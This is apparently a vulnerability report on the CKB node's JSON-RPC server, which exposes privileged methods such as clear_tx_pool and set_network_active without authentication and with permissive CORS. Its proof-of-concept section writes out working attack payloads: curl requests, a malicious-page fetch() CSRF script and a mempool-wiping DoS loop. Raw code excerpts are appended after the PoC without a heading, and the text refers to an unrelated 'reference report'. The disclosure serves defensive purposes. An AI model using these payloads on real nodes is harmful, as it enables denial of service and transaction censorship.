### Title
Unauthenticated Privileged RPC Operations Allow Any Caller to Disrupt Node State — (File: `rpc/src/server.rs`, `rpc/src/module/pool.rs`, `rpc/src/module/net.rs`)

---

### Summary

The CKB JSON-RPC server (`rpc/src/server.rs`) has no authentication or authorization middleware. State-mutating privileged operations — including `clear_tx_pool`, `clear_tx_verify_queue`, `remove_transaction`, `set_network_active`, `set_ban`, and `clear_banned_addresses` — are exposed without any caller identity check. Any process or remote client that can reach the RPC endpoint can invoke these operations unconditionally, directly analogous to the `_authorizeUpgrade()` missing access control in the reference report.

---

### Finding Description

**Root cause — no authentication layer in the RPC server:**

`rpc/src/server.rs` builds the Axum router with only `CorsLayer::permissive()` and a timeout layer. There is no `Authorization` header validation, no token check, and no IP allowlist enforced at the application level:

```rust
let app = Router::new()
    .route("/", method_router.clone())
    .route("/{*path}", method_router)
    .route("/ping", get(ping_handler))
    .layer(Extension(Arc::clone(rpc)))
    .layer(CorsLayer::permissive())          // ← permissive CORS, not restrictive
    .layer(TimeoutLayer::with_status_code(
        StatusCode::REQUEST_TIMEOUT,
        Duration::from_secs(30),
    ))
    .layer(Extension(stream_config));
```

The `handle_jsonrpc` handler dispatches every incoming call directly to the method handler with no credential check:

```rust
async fn handle_jsonrpc<T: Default + Metadata>(
    Extension(io): Extension<Arc<MetaIoHandler<T>>>,
    req_body: Bytes,
) -> Response {
    // ... parses body, calls io.handle_call(call, T::default()).await
    // No Authorization header read, no token validated
}
```

**Privileged operations with no per-method authorization:**

`rpc/src/module/pool.rs` — `clear_tx_pool` removes every pending and proposed transaction from the mempool:

```rust
fn clear_tx_pool(&self) -> Result<()> {
    let snapshot = Arc::clone(&self.shared.snapshot());
    let tx_pool = self.shared.tx_pool_controller();
    tx_pool
        .clear_pool(snapshot)
        .map_err(|err| RPCError::custom(RPCError::Invalid, err.to_string()))?;
    Ok(())
}
```

`rpc/src/module/net.rs` — `set_network_active` disables all P2P networking:

```rust
fn set_network_active(&self, state: bool) -> Result<()> {
    self.network_controller.set_active(state);
    Ok(())
}
```

`rpc/src/module/net.rs` — `set_ban` bans arbitrary IP ranges:

```rust
fn set_ban(...) -> Result<()> {
    // ...
    self.network_controller.ban(ip_network, ban_until, reason.unwrap_or_default());
    Ok(())
}
```

Neither the server layer nor any of these method implementations checks caller identity. The miner client (`miner/src/client.rs`) does optionally send HTTP Basic Auth headers via `parse_authorization`, but the server never reads or validates them — confirming the server-side gap is intentional absence, not an oversight in the client.

**Module enablement:**

`Pool` and `Net` modules are enabled by default in `resource/ckb.toml`:
```toml
modules = ["Net", "Pool", "Miner", "Chain", "Stats", "Subscription", "Experiment", "Terminal"]
```

---

### Impact Explanation

An attacker who can reach the RPC endpoint can:

1. **`clear_tx_pool()`** — Wipe the entire mempool instantly. All pending user transactions are discarded. Miners lose their assembled block templates. Users must resubmit transactions. Repeated calls create a sustained denial-of-service against transaction processing.

2. **`set_network_active(false)`** — Disable all P2P networking. The node stops receiving new blocks and transactions, becomes isolated from the network, and falls behind the chain tip silently.

3. **`set_ban` with crafted IP ranges** — Ban all known peers, severing the node's connections. Combined with `clear_banned_addresses` to reset and re-ban, this creates a persistent peer-isolation loop.

4. **`remove_transaction`** — Selectively evict specific transactions from the pool, enabling targeted censorship of specific users' transactions.

Impact category: **Service unavailability / severe degradation** and **unauthorized state changes** on a production CKB node.

---

### Likelihood Explanation

The default `listen_address = "127.0.0.1:8114"` binds to localhost, which limits exposure to processes on the same host. However:

- Many operators expose the RPC port to the internet (explicitly warned against in `ckb.toml` but no enforcement exists).
- Any malicious process co-located on the same host (e.g., a compromised dependency, a malicious dApp, a web browser via CORS — which is set to `permissive`) can reach `127.0.0.1:8114` without any credential.
- `CorsLayer::permissive()` means a malicious web page loaded in a browser on the same machine can issue cross-origin `POST` requests to `http://127.0.0.1:8114` and invoke `clear_tx_pool` or `set_network_active(false)` with no user interaction beyond visiting the page.

The CORS-permissive configuration is the key escalation: it converts a "local process" threat into a "any website the node operator visits" threat.

---

### Recommendation

1. **Add an authentication middleware** to the Axum router in `rpc/src/server.rs` that validates a configurable bearer token or HTTP Basic Auth credential before dispatching any call. The miner client already has the client-side infrastructure (`parse_authorization` in `miner/src/client.rs`) — the server side is simply missing the corresponding validation.

2. **Replace `CorsLayer::permissive()`** with a restrictive CORS policy (e.g., `CorsLayer::new()` with an explicit allowlist) to prevent cross-origin browser-based exploitation of localhost-bound endpoints.

3. **Separate privileged mutating methods** (`clear_tx_pool`, `set_network_active`, `set_ban`) from read-only methods and gate them behind the authentication check, following the same pattern as OpenZeppelin's `onlyOwner` modifier on `_authorizeUpgrade`.

### Proof of Concept

**Scenario A — Remote attacker with exposed RPC:**
```bash
# Clear the entire mempool of a node with RPC exposed on 0.0.0.0:8114
curl -X POST http://<node-ip>:8114 \
  -H 'Content-Type: application/json' \
  -d '{"jsonrpc":"2.0","method":"clear_tx_pool","params":[],"id":1}'
# Response: {"jsonrpc":"2.0","result":null,"id":1}
# All pending transactions are gone. No credentials required.
```

**Scenario B — Browser-based CSRF against localhost (CORS permissive):**
```html
<!-- Malicious page visited by node operator -->
<script>
fetch("http://127.0.0.1:8114", {
  method: "POST",
  headers: {"Content-Type": "application/json"},
  body: JSON.stringify({
    jsonrpc: "2.0", method: "set_network_active",
    params: [false], id: 1
  })
});
// Node's P2P networking is now disabled. No credentials required.
</script>
```

**Scenario C — Sustained mempool DoS loop:**
```bash
while true; do
  curl -s -X POST http://127.0.0.1:8114 \
    -H 'Content-Type: application/json' \
    -d '{"jsonrpc":"2.0","method":"clear_tx_pool","params":[],"id":1}'
  sleep 1
done
# Mempool is cleared every second; no transactions can accumulate for mining.
```

All three scenarios require zero credentials and exploit the absence of any authorization check in `handle_jsonrpc` (`rpc/src/server.rs:218`) and the individual method implementations in `rpc/src/module/pool.rs:684` and `rpc/src/module/net.rs:772`.     fn set_ban(
        &self,
        address: String,
        command: String,
        ban_time: Option<Timestamp>,
        absolute: Option<bool>,
        reason: Option<String>,
    ) -> Result<()> {
        let ip_network = address.parse().map_err(|_| {
            RPCError::invalid_params(format!(
                "Expected `params[0]` to be a valid IP address, got {address}"
            ))
        })?;

        match command.as_ref() {
            "insert" => {
                let ban_until = if absolute.unwrap_or(false) {
                    ban_time.unwrap_or_default().into()
                } else {
                    unix_time_as_millis()
                        + ban_time
                            .unwrap_or_else(|| DEFAULT_BAN_DURATION.into())
                            .value()
                };
                self.network_controller
                    .ban(ip_network, ban_until, reason.unwrap_or_default());
                Ok(())
            }
            "delete" => {
                self.network_controller.unban(&ip_network);
                Ok(())
            }
            _ => Err(RPCError::invalid_params(format!(
                "Expected `params[1]` to be in the list [insert, delete], got {address}"
            ))),
        }
    }

fn parse_authorization(url: &Uri) -> Option<HeaderValue> {
    let a: Vec<&str> = url.authority()?.as_str().split('@').collect();
    if a.len() >= 2 {
        if a[0].is_empty() {
            return None;
        }
        let mut encoded = "Basic ".to_string();
        base64::prelude::BASE64_STANDARD.encode_string(a[0], &mut encoded);
        let mut header = HeaderValue::from_str(&encoded).unwrap();
        header.set_sensitive(true);
        Some(header)
    } else {
        None
    }
}
